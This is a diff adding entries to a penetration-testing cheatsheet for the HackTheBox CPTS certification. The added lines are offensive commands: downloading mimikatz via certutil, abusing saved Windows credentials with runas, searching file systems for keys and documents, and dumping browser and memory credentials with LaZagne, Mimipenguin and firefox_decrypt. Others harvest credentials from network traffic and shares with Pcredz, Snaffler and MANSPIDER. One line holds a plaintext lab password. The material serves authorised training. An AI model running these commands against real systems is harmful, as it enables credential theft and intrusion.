@@ -36,6 +36,8 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
     - [Remote Password Attacks](#remote-local-password-attacks)
     - [Windows Local Password Attacks](#windows-local-password-attacks)
     - [Linux Local Password Attacks](#linux-password-attacks)
+    - [Credential Hunting In Network Traffic](#credential-hunting-in-network-traffic)
+    - [Credential Hunting in Network Shares](#credential-hunting-in-network-shares)
     - [Cracking Passwords](#cracking-passwords)
 - [Attacking Common Services](#attacking-common-services)
     - [Attacking SMB](#attacking-smb)
@@ -350,6 +352,9 @@ Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/
 # Download a File Using Certutil 
 certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
 
+# Download a File Using Certutil 
+certutil.exe -urlcache -f http://10.10.15.8:8000/mimikatz.exe mimikatz.exe
+
 # Download a file with PowerShell with Synchronous 
 (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
 
@@ -472,6 +477,12 @@ netexec smb <ip> -u <username> -p <password> --ntds
 ```
 ##### Windows Local Password Attacks
 ```
+# Enumerate credentials stored in the current user's profile
+cmdkey /list
+
+# Launch a new instance of cmd.exe while impersonating a stored user.
+runas /savecred /user:<username> cmd
+
 # Uses LaZagne tool to discover credentials that web browsers or other installed applications may insecurely store.
 start LaZagne.exe all
 
@@ -518,11 +529,57 @@ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc|lib");do echo -e "\nFil
 # Script that can be used to find common database files.
 for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc|lib|headers|share|man";done
 
+# Script that can be used to search for common file types used with scripts.
+for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc|lib|headers|share";done
+
+# Script used to look for common types of documents.
+for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib|fonts|share|core" ;done
+
 # Uses Linux-based find command to search for text files.
 find /home/* -type f -name "*.txt" -o ! -name "*.*"
 
 # Uses Linux-based command grep to search the file system for key terms PRIVATE KEY to discover SSH keys.
 grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
+
+# Uses Linux-based tail command to search the through bash history files and output the last 5 lines..
+grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
+
+# Uses Mimipenguin to find creds in memory and cache
+sudo python3 mimipenguin.py
+
+# Runs Mimipenguin.sh using bash.
+sudo bash mimipenguin.sh
+
+# Uses laZagne to find creds from various source
+sudo python2.7 laZagne.py all
+
+# Runs laZagne.py browsers module using Python 3.
+sudo python3 laZagne.py browsers
+
+# Uses Linux-based command to search for credentials stored by Firefox then searches for the keyword default using grep.
+ls -l .mozilla/firefox/ | grep default
+
+# Uses Linux-based command cat to search for credentials stored by Firefox in JSON.
+cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
+
+# 	Runs Firefox_decrypt.py to decrypt any encrypted credentials stored by Firefox. Program will run using python3.9.
+python3.9 firefox_decrypt.py  
+```
+##### Credential Hunting In Network Traffic
+```
+# Uses Pcredz to extract credentials from live traffic or network packet captures. (https://github.com/lgandx/PCredz)
+./Pcredz -f demo.pcapng -t -v
+```
+##### Credential Hunting in Network Shares
+```
+# Search network shares for interesting files and credentials by Snaffler .  ( https://github.com/SnaffCon/Snaffler )
+snaffler.exe -s
+
+# Search network shares for interesting files and save the results by PowerHuntShares.  ( https://github.com/NetSPI/PowerHuntShares )
+Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
+
+# Search network shares for interesting credentials  by MANSPIDER.(https://github.com/blacklanternsecurity/MANSPIDER)
+docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c 'password' -u 'mendres' -p 'Inlanefreight2025!'
 ```
 ##### Cracking Passwords
 ```
